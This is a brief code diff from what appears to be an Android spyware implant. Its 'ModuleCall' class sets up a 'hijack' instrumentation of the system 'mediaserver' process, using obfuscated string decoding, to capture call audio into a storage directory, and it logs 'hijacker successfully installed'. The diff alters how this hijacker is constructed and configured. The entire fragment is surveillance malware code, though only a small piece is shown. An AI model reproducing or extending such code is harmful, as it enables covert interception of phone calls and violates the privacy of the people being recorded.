@@ -318,8 +318,8 @@ public class ModuleCall extends BaseModule   {
 		hjcb = new CallBack();
 		hjcb.register(new HC());
 
-		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage(),M.e("irg"),Status.self().semaphoreMediaserver,M.e("ib.data"));
-
+		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage(),Status.self().semaphoreMediaserver,M.e("ib.data"));
+		hijack.setInstrumentationSuccessDir(AudioEncoder.getAudioStorage(),false);
 		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): hijacker successfully installed");
